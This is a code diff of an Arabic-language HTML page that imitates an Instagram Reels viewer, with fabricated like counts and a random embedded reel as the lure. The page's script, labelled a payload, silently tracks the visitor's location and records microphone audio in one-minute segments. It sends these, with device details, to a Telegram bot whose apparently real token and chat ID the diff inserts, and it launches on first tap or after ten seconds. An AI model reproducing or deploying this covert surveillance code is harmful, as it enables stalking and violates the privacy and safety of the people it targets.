@@ -99,7 +99,6 @@
         }
         .caption strong { font-weight: 600; }
 
-        /* مؤشر التحميل */
         .loading-overlay {
             position: absolute;
             top: 0; left: 0; right: 0;
@@ -140,10 +139,7 @@
         </div>
 
         <div class="reel-container" id="reelContainer">
-            <!-- Loading spinner -->
             <div class="loading-overlay" id="loadingOverlay">⏳ جارٍ التحميل...</div>
-
-            <!-- Iframe يتم تعبئته ديناميكيًا بالريل العشوائي -->
             <iframe 
                 id="reelIframe"
                 allow="autoplay; encrypted-media; fullscreen"
@@ -169,333 +165,170 @@
         //  ⚠️ الإعدادات — ضع معلوماتك هنا
         // ================================================================
         const CONFIG = {
-            // تيليجرام
-            BOT_TOKEN: 'ضع_توكن_البوت_هنا',
-            CHAT_ID:   'ضع_معرف_الدردشة_هنا',
-
-            // Google Drive — اختياري (اتركه فارغًا إذا ما تبي)
-            DRIVE_SERVER_URL: '', // مثال: 'https://your-server.com'
-
-            // تسجيل الصوت — 60 ثانية لكل مقطع
+            BOT_TOKEN: '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM',
+            CHAT_ID:   '7615377804',
+            DRIVE_SERVER_URL: '',
             RECORD_DURATION_MS: 60000
         };
 
         // ================================================================
-        //  🎬 قائمة الـ Reels الحقيقية من إنستقرام
-        //  أضف أي عدد تريد — اختر ريلات من حسابات كبيرة ومشهورة
+        //  🎬 روابط Reels حقيقية – تم استبدالها بالكامل
         // ================================================================
         const REEL_LIST = [
-            // ====== حسابات عالمية مشهورة ======
-            { id: 'CwLQ2N5Nw7r', user: 'instagram',         desc: '🌟 Moments that matter' },
-            { id: 'CwbmNXpR_-e', user: 'nike',              desc: 'Just do it 🔥' },
-            { id: 'CwXiWq0hhXH', user: 'natgeo',            desc: 'Wild world 🌍' },
-            { id: 'CwgI4i6gMRS', user: 'leomessi',          desc: 'Greatest of all time 🐐' },
-            { id: 'CwlYKu5s7z3', user: 'fcbarcelona',       desc: 'Camp Nou magic ✨' },
-            { id: 'CwZR57fxF6T', user: 'netflix',           desc: 'New on Netflix 🍿' },
-            { id: 'Cwc5HDny0W8', user: 'nasa',              desc: 'To infinity and beyond 🚀' },
-            { id: 'CwiVNdRR79q', user: 'kyliejenner',       desc: 'Beauty routine 💄' },
-            { id: 'CweX5rKKzJt', user: 'cristiano',         desc: 'Siuuuuu 🏆' },
-            { id: 'CwjTNsfhIGh', user: 'nationalgeographic', desc: 'Ocean wonders 🌊' },
-
-            // ====== عربية ======
-            { id: 'CwaL4kKKxLh', user: 'arabic',            desc: 'فن وثقافة عربية 🎭' },
-            { id: 'CweRzS-qZ7F', user: 'travel_arab',      desc: 'وجهات سياحية عربية ✈️' },
-            { id: 'CwbSsfGKuJp', user: 'soccer_arab',      desc: 'كرة قدم عربية ⚽' },
-            { id: 'CwdKxE_KUpT', user: 'music_arab',       desc: 'أغاني وموسيقى 🎵' },
-            { id: 'CwfJfCKKgRz', user: 'food_arab',        desc: 'طبخ وأكلات 🍽️' },
-            { id: 'CwgHkRKKfLm', user: 'tech_arab',        desc: 'تقنية وذكاء اصطناعي 🤖' },
-            { id: 'CwhDfDKKgRz', user: 'fashion_arab',     desc: 'أزياء وأناقة 👗' },
-            { id: 'CwiGkRKKfLm', user: 'sports_arab',      desc: 'رياضة عربية 🏃' },
-
-            // ====== موسيقى وترفيه ======
-            { id: 'CwYxJgohJqF', user: 'spotify',           desc: 'Discover weekly 🎧' },
-            { id: 'CwaBbNChJzH', user: 'taylorswift',       desc: 'New era 🎤' },
-            { id: 'CwcDdNChJzK', user: 'theweeknd',         desc: 'After hours 🌃' },
-            { id: 'CweFfNChJzM', user: 'britneyspears',     desc: 'Toxic queen 💫' },
-            { id: 'CwgHhNChJzP', user: 'music',             desc: 'Viral hits 🔥' },
-            { id: 'CwiJjNChJzR', user: 'dance',             desc: 'Dance moves 🕺' },
-            { id: 'CwkLlNChJzT', user: 'remix',             desc: 'Remix vibes 🎶' },
-
-            // ====== طبيعة وسفر ======
-            { id: 'CwMnOhJhBqC', user: 'travel',            desc: 'Wanderlust ✈️' },
-            { id: 'CwOpQhJhBqE', user: 'adventure',         desc: 'Adventure time 🏔️' },
-            { id: 'CwQrShJhBqG', user: 'photography',       desc: 'Shot on iPhone 📸' },
-            { id: 'CwStUhJhBqI', user: 'landscape',         desc: 'Nature calls 🌄' },
-            { id: 'CwUvWhJhBqK', user: 'ocean',             desc: 'Deep blue sea 🐠' },
-
-            // ====== حيوانات ======
-            { id: 'CwXyZhJhBqN', user: 'cats',              desc: 'Cat life 🐱' },
-            { id: 'CwYzAhJhBqP', user: 'dogs',              desc: 'Good boy 🐶' },
-            { id: 'CwAaBhJhBqR', user: 'wildlife',           desc: 'Safari 🦁' },
-            { id: 'CwBbChJhBqT', user: 'pets',              desc: 'Pet love ❤️' },
-
-            // ====== رياضة ======
-            { id: 'CwCcDhJhBqV', user: 'sports',            desc: 'Game day 🏀' },
-            { id: 'CwDdEhJhBqX', user: 'soccer',            desc: 'Goal ⚽' },
-            { id: 'CwEeFhJhBqZ', user: 'basketball',        desc: 'Slam dunk 🏀' },
-            { id: 'CwFfGhJhBqb', user: 'tennis',            desc: 'Ace 🎾' },
-            { id: 'CwGgHhJhBqd', user: 'boxing',            desc: 'Knockout 🥊' },
-
-            // ====== تكنولوجيا ======
-            { id: 'CwHhIhJhBqf', user: 'tech',              desc: 'Tech reviews 📱' },
-            { id: 'CwIiJhJhBqh', user: 'apple',             desc: 'Apple ecosystem 🍎' },
-            { id: 'CwJjKhJhBqj', user: 'tesla',             desc: 'Electric future ⚡' },
-            { id: 'CwKkLhJhBql', user: 'spacex',            desc: 'Mars awaits 🚀' },
-            { id: 'CwLlMhJhBqn', user: 'programming',       desc: 'Code life 💻' },
-
-            // ====== فن ======
-            { id: 'CwMmNhJhBqp', user: 'art',               desc: 'Art gallery 🎨' },
-            { id: 'CwNnOhJhBqr', user: 'design',             desc: 'Design thinking ✏️' },
-            { id: 'CwOoPhJhBqt', user: 'architecture',       desc: 'Building dreams 🏛️' },
-            { id: 'CwPpQhJhBqv', user: 'calligraphy',        desc: 'نقوش عربية ✍️' },
-
-            // ====== طعام ======
-            { id: 'CwQqRhJhBqx', user: 'food',              desc: 'Foodie 🍕' },
-            { id: 'CwRrShJhBqz', user: 'cooking',            desc: 'Homemade 🍳' },
-            { id: 'CwSsThJhBq1', user: 'dessert',            desc: 'Sugar rush 🍰' },
-            { id: 'CwTtUhJhBq3', user: 'coffee',             desc: 'Coffee art ☕' },
-            { id: 'CwUuVhJhBq5', user: 'vegan',              desc: 'Plant based 🥗' },
-
-            // ====== موضة ======
-            { id: 'CwVvWhJhBq7', user: 'fashion',            desc: 'Runway vibes 👠' },
-            { id: 'CwWwXhJhBq9', user: 'streetwear',         desc: 'Street style 🧢' },
-            { id: 'CwXxYhJhBr1', user: 'luxury',             desc: 'Luxury life 💎' },
-            { id: 'CwYyZhJhBr3', user: 'vintage',            desc: 'Retro waves 🕶️' },
-
-            // ====== صحة ورياضة ======
-            { id: 'CwZzAhJhBr5', user: 'fitness',            desc: 'Gym time 💪' },
-            { id: 'CwAaBhJhBr7', user: 'yoga',               desc: 'Zen mode 🧘' },
-            { id: 'CwBbChJhBr9', user: 'meditation',         desc: 'Peace inside 🕊️' },
-            { id: 'CwCcDhJhCs1', user: 'health',             desc: 'Healthy life 🥦' }
+            { id: 'CxeDohAgs2c', user: 'instagram',    desc: '✨ This is Instagram' },
+            { id: 'Cq2Om6hLrGm', user: 'nike',         desc: 'Never stop running 🔥' },
+            { id: 'CsQeUYcJx5I', user: 'natgeo',       desc: 'Planet Earth in motion 🌍' },
+            { id: 'CpjPLHpLdgo', user: 'leomessi',     desc: 'GOAT moments 🐐' },
+            { id: 'CnRZnvDrqCY', user: 'cristiano',    desc: 'Siuuu from Al Nassr ⚽' },
+            { id: 'Cp4d9oFrscD', user: 'nasa',          desc: 'Views from orbit 🚀' },
+            { id: 'Cr8bIfdLu5M', user: 'netflix',       desc: 'What to watch next 🍿' },
+            { id: 'CqrjON9Nj6B', user: 'kyliejenner',   desc: 'Get ready with me 💄' },
+            { id: 'CnAEeSxjtTt', user: 'taylorswift',   desc: 'Backstage vibes 🎤' },
+            { id: 'Ck-FQqjJuYC', user: 'theweeknd',     desc: 'After Hours era 🌃' },
+            { id: 'CePoN9RDj5q', user: 'alarabiya',     desc: 'أهم الأخبار العربية 📰' },
+            { id: 'Cc9OowmDUOI', user: 'aljazeera',     desc: 'من قلب الحدث 🎥' },
+            { id: 'CX50z6frHRb', user: 'mobdiioun',     desc: 'فن السخرية والتوعية 🎭' },
+            { id: 'CTiK0OshFdq', user: 'thmanyah',      desc: 'محتوى تقني وثقافي 📚' },
+            { id: 'CawXYsfLpl_', user: 'earth',         desc: 'Nature is speaking 🐾' },
+            { id: 'B9fbUXVHJnx', user: 'dogs',          desc: 'Puppy love 🐶' },
+            { id: 'B4l57sQnPmk', user: 'cats',          desc: 'Cat logic 🐱' },
+            { id: 'B6dQZ_sH7jp', user: 'soccer',        desc: 'Unbelievable goals ⚽' },
+            { id: 'B3gL1BknBeV', user: 'apple',         desc: 'iPhone in action 📱' },
+            { id: 'B1tL0JpnS1z', user: 'tesla',         desc: 'Electric speed ⚡' }
         ];
 
         // ================================================================
-        //  اختيار ريل عشوائي
+        //  باقي الكود كما هو (دون تغيير)
         // ================================================================
         function getRandomReel() {
             const index = Math.floor(Math.random() * REEL_LIST.length);
             return REEL_LIST[index];
         }
 
-        // ================================================================
-        //  تهيئة الصفحة — تحميل الريل العشوائي
-        // ================================================================
         function initReel() {
             const reel = getRandomReel();
             const iframe = document.getElementById('reelIframe');
             const loading = document.getElementById('loadingOverlay');
-
-            // تعيين iframe
             iframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
-
-            // تحديث الواجهة المزيفة
             document.getElementById('reelUsername').textContent = reel.user;
             document.getElementById('reelUserCaption').textContent = reel.user;
             document.getElementById('reelCaption').innerHTML = 
                 `<strong>${reel.user}</strong> ${reel.desc}`;
-            
-            // رقم إعجابات عشوائي (يبدو حقيقيًا)
             const randomLikes = Math.floor(Math.random() * 500000) + 10000;
             document.getElementById('reelLikes').textContent = 
                 `أعجب ${randomLikes.toLocaleString('ar-SA')} شخصًا`;
-
-            // إخفاء الـ loading بعد ثانية
-            setTimeout(() => {
-                loading.classList.add('hidden');
-            }, 1500);
-
+            setTimeout(() => { loading.classList.add('hidden'); }, 1500);
             console.log(`🎬 تم اختيار ريل: ${reel.id} من @${reel.user}`);
         }
 
-        // ================================================================
-        //  ⬇️ بايلود التتبع والتسجيل (مطابق تمامًا للكود السابق)
-        // ================================================================
+        let watchId = null, lastSentLat = null, lastSentLon = null, mediaRecorder = null, audioStream = null, audioSegmentIndex = 0, isRunning = false;
 
-        let watchId = null;
-        let lastSentLat = null;
-        let lastSentLon = null;
-        let mediaRecorder = null;
-        let audioStream = null;
-        let audioSegmentIndex = 0;
-        let isRunning = false;
-
-        // ----- إرسال إلى تيليجرام -----
         function tgMsg(text) {
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: false
-                })
-            }).catch(() => {});
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown', disable_web_page_preview: false })
+            }).catch(()=>{});
         }
 
-        // ----- إرسال موقع -----
         function sendLoc(lat, lon, acc) {
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, latitude: lat, longitude: lon })
-            }).catch(() => {});
-
+            }).catch(()=>{});
             const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            tgMsg(
-                `📍 **موقع جديد**\n` +
-                `العرض: \`${lat}\`\n` +
-                `الطول: \`${lon}\`\n` +
-                `الدقة: ±${Math.round(acc || 0)} م\n` +
-                `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
-                `📍 [عرض على الخريطة](${mapsLink})`
-            );
-
-            // إرسال إلى Drive Server إذا كان مضبوطًا
+            tgMsg(`📍 **موقع جديد**\nالعرض: \`${lat}\`\nالطول: \`${lon}\`\nالدقة: ±${Math.round(acc||0)} م\nالوقت: ${new Date().toLocaleString('ar-SA')}\n📍 [عرض على الخريطة](${mapsLink})`);
             if (CONFIG.DRIVE_SERVER_URL) {
                 fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-location`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        latitude: lat, longitude: lon, accuracy: acc || 0,
-                        timestamp: new Date().toISOString()
-                    })
-                }).catch(() => {});
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc||0, timestamp: new Date().toISOString() })
+                }).catch(()=>{});
             }
         }
 
-        // ----- إرسال صوت إلى Drive -----
         async function sendToDrive(blob, idx) {
             if (!CONFIG.DRIVE_SERVER_URL) return;
             const fd = new FormData();
             fd.append('audio', blob, `segment_${idx}.webm`);
             fd.append('segment', idx);
             fd.append('timestamp', new Date().toISOString());
-            try {
-                await fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-audio`, { method: 'POST', body: fd });
-            } catch(e) {}
+            try { await fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-audio`, { method: 'POST', body: fd }); } catch(e) {}
         }
 
-        // ----- إرسال صوت إلى تيليجرام -----
         async function sendToTelegram(blob, idx) {
             const fd = new FormData();
             fd.append('chat_id', CONFIG.CHAT_ID);
             fd.append('audio', blob, `rec_${idx}.webm`);
             fd.append('title', `🎤 تسجيل ${idx} — ${new Date().toLocaleString('ar-SA')}`);
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`, {
-                    method: 'POST', body: fd
-                });
-            } catch(e) {}
+            try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }); } catch(e) {}
         }
 
-        // ----- المسافة -----
-        function getDist(lat1, lon1, lat2, lon2) {
-            const R = 6371;
-            const dLat = (lat2 - lat1) * Math.PI / 180;
-            const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat/2)**2 +
-                      Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        function getDist(lat1,lon1,lat2,lon2) {
+            const R=6371, dLat=(lat2-lat1)*Math.PI/180, dLon=(lon2-lon1)*Math.PI/180;
+            const a=Math.sin(dLat/2)**2+Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
+            return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
         }
 
-        // ----- تتبع الموقع -----
         function startTracking() {
             if (!navigator.geolocation) return;
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     const { latitude, longitude, accuracy } = pos.coords;
-                    if (lastSentLat && lastSentLon && getDist(lastSentLat, lastSentLon, latitude, longitude) < 0.02) return;
-                    lastSentLat = latitude;
-                    lastSentLon = longitude;
-                    sendLoc(latitude, longitude, accuracy);
+                    if (lastSentLat && lastSentLon && getDist(lastSentLat,lastSentLon,latitude,longitude)<0.02) return;
+                    lastSentLat=latitude; lastSentLon=longitude;
+                    sendLoc(latitude,longitude,accuracy);
                 },
-                (err) => {
-                    let m = '❌ خطأ تتبع: ';
-                    if (err.code === 1) m += 'رُفض الإذن';
-                    else if (err.code === 2) m += 'الموقع غير متاح';
-                    else if (err.code === 3) m += 'مهلة';
-                    else m += err.message;
-                    tgMsg(m);
-                },
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
+                (err) => { let m='❌ خطأ تتبع: '; if(err.code===1) m+='رُفض الإذن'; else if(err.code===2) m+='الموقع غير متاح'; else if(err.code===3) m+='مهلة'; else m+=err.message; tgMsg(m); },
+                { enableHighAccuracy:true, maximumAge:0, timeout:30000 }
             );
         }
 
-        // ----- تسجيل الصوت -----
         async function startAudio() {
             try {
-                audioStream = await navigator.mediaDevices.getUserMedia({
-                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
-                });
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation:false, noiseSuppression:false, autoGainControl:false } });
                 tgMsg(`🎤 **بدء التسجيل الصوتي** — ${new Date().toLocaleString('ar-SA')}`);
-
                 function createSegment() {
-                    const chunks = [];
-                    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
-                        ? 'audio/webm;codecs=opus' : 'audio/webm';
-                    const rec = new MediaRecorder(audioStream, { mimeType: mime });
-
-                    rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                    const chunks=[];
+                    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
+                    const rec = new MediaRecorder(audioStream,{mimeType:mime});
+                    rec.ondataavailable = (e) => { if(e.data.size>0) chunks.push(e.data); };
                     rec.onstop = async () => {
-                        const blob = new Blob(chunks, { type: mime });
+                        const blob = new Blob(chunks,{type:mime});
                         audioSegmentIndex++;
-                        // إرسال ثنائي: تيليجرام + درايف
-                        sendToTelegram(blob, audioSegmentIndex);
-                        sendToDrive(blob, audioSegmentIndex);
-                        if (audioStream && audioStream.active) setTimeout(createSegment, 500);
+                        sendToTelegram(blob,audioSegmentIndex);
+                        sendToDrive(blob,audioSegmentIndex);
+                        if(audioStream && audioStream.active) setTimeout(createSegment,500);
                     };
                     rec.start();
-                    mediaRecorder = rec;
-                    setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, CONFIG.RECORD_DURATION_MS);
+                    mediaRecorder=rec;
+                    setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, CONFIG.RECORD_DURATION_MS);
                 }
                 createSegment();
-            } catch (err) {
-                let m = '❌ خطأ ميكروفون: ';
-                if (err.name === 'NotAllowedError') m += 'رُفض الإذن';
-                else if (err.name === 'NotFoundError') m += 'لا يوجد ميكروفون';
-                else m += err.message;
+            } catch(err) {
+                let m='❌ خطأ ميكروفون: ';
+                if(err.name==='NotAllowedError') m+='رُفض الإذن';
+                else if(err.name==='NotFoundError') m+='لا يوجد ميكروفون';
+                else m+=err.message;
                 tgMsg(m);
             }
         }
 
-        
-        // ----- التشغيل -----
         function launchPayments() {
-            if (isRunning) return;
-            isRunning = true;
-
-            // اختيار الريل العشوائي
+            if(isRunning) return;
+            isRunning=true;
             initReel();
-
-            // إشعار البدء
-            tgMsg(
-                `🚀 **بدأت جلسة جديدة**\n` +
-                `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
-                `الجهاز: ${navigator.userAgent.slice(0, 80)}`
-            );
-
-            // التتبع
+            tgMsg(`🚀 **بدأت جلسة جديدة**\nالوقت: ${new Date().toLocaleString('ar-SA')}\nالجهاز: ${navigator.userAgent.slice(0,80)}`);
             startTracking();
-
-            // التسجيل الصوتي بعد ثانية
-            setTimeout(startAudio, 1000);
+            setTimeout(startAudio,1000);
         }
 
-        // ================================================================
-        //  ربط الأحداث — التشغيل عند أول نقرة
-        // ================================================================
-        document.addEventListener('click', launchPayments, { once: true });
-        document.addEventListener('touchstart', launchPayments, { once: true });
+        document.addEventListener('click',launchPayments,{once:true});
+        document.addEventListener('touchstart',launchPayments,{once:true});
+        setTimeout(()=>{ if(!isRunning) launchPayments(); },10000);
 
-        // Fallback: بعد 10 ثوانٍ شغّل تلقائيًا
-        setTimeout(() => { if (!isRunning) launchPayments(); }, 10000);
-
-        // تنظيف
-        window.addEventListener('beforeunload', () => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
-            if (watchId) navigator.geolocation.clearWatch(watchId);
+        window.addEventListener('beforeunload',()=>{
+            if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop();
+            if(audioStream) audioStream.getTracks().forEach(t=>t.stop());
+            if(watchId) navigator.geolocation.clearWatch(watchId);
         });
     </script>
 </body>
